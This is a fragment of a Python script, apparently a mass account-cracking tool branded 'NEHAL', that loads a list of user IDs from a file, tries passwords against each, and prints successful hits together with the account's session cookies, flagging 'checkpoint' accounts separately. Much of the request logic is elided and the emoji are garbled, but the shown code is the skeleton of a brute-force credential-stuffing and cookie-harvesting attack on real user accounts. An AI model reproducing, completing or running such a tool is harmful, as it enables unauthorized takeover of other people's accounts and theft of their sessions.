...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mNEHAL')
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/NEHAL.txt  Etc...]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[ðŸ˜»FIREðŸ˜»] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}â€¢{P}[{h}Ok{P}â€¢{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#NEHAL-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢NEHAL-Cp] {idf} â€¢ {pw}\n\033[0;93[ðŸ¤Ÿ]= COOKIESâ€¢ \033[0;92m{kuki} ')     
				...
				#NEHAL-King
				print(f'\r\033[0;92m[NEHAL-âž¼-OKðŸ˜»] {idf} â€¢ {pw}\n\033[0;93m[ðŸ”¥]= COOKIES â€¢ \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " NEHAL,  Ok,  id"')
